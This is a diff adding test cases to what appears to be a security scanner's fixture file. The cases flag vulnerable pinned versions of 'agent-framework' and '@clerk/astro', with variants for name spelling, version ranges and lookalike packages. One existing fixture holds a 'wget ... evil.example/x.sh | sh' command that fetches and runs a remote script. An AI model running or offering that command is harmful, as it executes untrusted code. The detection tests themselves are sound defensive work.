@@ -128,5 +128,170 @@
     "name": "setup_wget",
     "expect": "finding",
     "body": "wget -qO- https://evil.example/x.sh | sh\n"
+  },
+  {
+    "name": "pkg_agent_pin_1261",
+    "expect": "finding",
+    "body": "agent-framework==1.26.1\n"
+  },
+  {
+    "name": "pkg_agent_pin_1262",
+    "expect": "finding",
+    "body": "agent-framework==1.26.2\n"
+  },
+  {
+    "name": "pkg_agent_lock_1261",
+    "expect": "finding",
+    "body": "[[package]]\nname = \"agent-framework\"\nversion = \"1.26.1\"\n"
+  },
+  {
+    "name": "pkg_agent_range",
+    "expect": "unknown",
+    "body": "agent-framework>=1.26.0\n"
+  },
+  {
+    "name": "pkg_agent_tilde",
+    "expect": "unknown",
+    "body": "agent-framework~=1.26\n"
+  },
+  {
+    "name": "pkg_agent_pin_1260",
+    "expect": "ok",
+    "body": "agent-framework==1.26.0\n"
+  },
+  {
+    "name": "pkg_agent_pin_1263",
+    "expect": "ok",
+    "body": "agent-framework==1.26.3\n"
+  },
+  {
+    "name": "pkg_agent_pin_1250",
+    "expect": "ok",
+    "body": "agent-framework==1.25.0\n"
+  },
+  {
+    "name": "pkg_agent_absent",
+    "expect": "ok",
+    "body": "requests==2.32.3\n"
+  },
+  {
+    "name": "pkg_clerk_4125_attr",
+    "expect": "finding",
+    "body": "resolved @clerk/astro@4.1.25\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_4126_attr",
+    "expect": "ok",
+    "body": "resolved @clerk/astro@4.1.26\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_420_attr",
+    "expect": "ok",
+    "body": "resolved @clerk/astro@4.2.0\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_21717_attr",
+    "expect": "finding",
+    "body": "resolved @clerk/astro@2.17.17\nexport const onRequest = clerkMiddleware()\n<meta content={title} />\n"
+  },
+  {
+    "name": "pkg_clerk_21718_attr",
+    "expect": "ok",
+    "body": "resolved @clerk/astro@2.17.18\nexport const onRequest = clerkMiddleware()\n<meta content={title} />\n"
+  },
+  {
+    "name": "pkg_clerk_21719_attr",
+    "expect": "ok",
+    "body": "resolved @clerk/astro@2.17.19\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_300_attr",
+    "expect": "finding",
+    "body": "resolved @clerk/astro@3.0.0\nexport const onRequest = clerkMiddleware()\n<img alt={name} />\n"
+  },
+  {
+    "name": "pkg_clerk_399_attr",
+    "expect": "finding",
+    "body": "resolved @clerk/astro@3.9.9\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_100_attr",
+    "expect": "finding",
+    "body": "resolved @clerk/astro@1.2.0\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_4010_attr",
+    "expect": "finding",
+    "body": "resolved @clerk/astro@4.0.0\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_range",
+    "expect": "unknown",
+    "body": "\"@clerk/astro\": \"^4.1.0\"\n"
+  },
+  {
+    "name": "pkg_clerk_4125_no_use",
+    "expect": "unknown",
+    "body": "resolved @clerk/astro@4.1.25\n"
+  },
+  {
+    "name": "pkg_clerk_nextjs",
+    "expect": "ok",
+    "body": "resolved @clerk/nextjs@4.1.25\nclerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_text_only",
+    "expect": "unknown",
+    "body": "resolved @clerk/astro@4.1.25\nTEXT_CONTENT_ONLY\nexport const onRequest = clerkMiddleware()\n<p>{query}</p>\n"
+  },
+  {
+    "name": "pkg_clerk_prerelease",
+    "expect": "unknown",
+    "body": "resolved @clerk/astro@4.1.26-beta.1\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_500_attr",
+    "expect": "ok",
+    "body": "resolved @clerk/astro@5.0.0\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_agent_underscore",
+    "expect": "finding",
+    "body": "agent_framework==1.26.1\n"
+  },
+  {
+    "name": "pkg_agent_dot",
+    "expect": "finding",
+    "body": "agent.framework==1.26.2\n"
+  },
+  {
+    "name": "pkg_agent_case",
+    "expect": "finding",
+    "body": "Agent-Framework==1.26.1\n"
+  },
+  {
+    "name": "pkg_agent_spaces",
+    "expect": "finding",
+    "body": "agent-framework == 1.26.1\n"
+  },
+  {
+    "name": "pkg_agent_extras",
+    "expect": "finding",
+    "body": "agent-framework[tools]==1.26.2\n"
+  },
+  {
+    "name": "pkg_agent_lookalike",
+    "expect": "ok",
+    "body": "agent-framework-client==1.26.1\n"
+  },
+  {
+    "name": "pkg_clerk_alias",
+    "expect": "finding",
+    "body": "\"clerk\": \"npm:@clerk/astro@4.1.25\"\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
+  },
+  {
+    "name": "pkg_clerk_zero",
+    "expect": "finding",
+    "body": "resolved @clerk/astro@0.9.0\nexport const onRequest = clerkMiddleware()\n<input value={query} />\n"
   }
 ]
